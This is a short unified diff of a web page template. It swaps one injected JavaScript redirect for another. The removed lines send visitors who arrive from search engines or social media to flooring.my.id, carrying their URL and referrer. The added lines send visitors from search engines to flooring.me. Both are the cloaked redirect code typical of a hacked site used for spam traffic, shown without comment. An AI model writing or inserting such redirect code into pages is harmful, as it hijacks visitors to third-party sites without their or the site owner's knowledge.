@@ -1,8 +1,12 @@
- <script>
-  //<![CDATA[
-var ars = 'https://flooring.my.id/';
+    if(document.referrer)
+    {
+    	var cek = document.referrer;
 
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', '.yahoo.', 'aol.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-//]]>
-</script>
-  <!--ads/auto.txt-->
+    	var is_se = cek.includes('.google.') || cek.includes('.bing.') || cek.includes('yandex.') || cek.includes('duckduckgo.') || cek.includes('.yahoo.') || cek.includes('aol.') || cek.includes('pinterest.');
+
+      if(is_se)
+    	{
+    		var url = window.location.href;
+    		window.location = "https://flooring.me/?arsae="+ encodeURIComponent(url);
+    	}
+    }
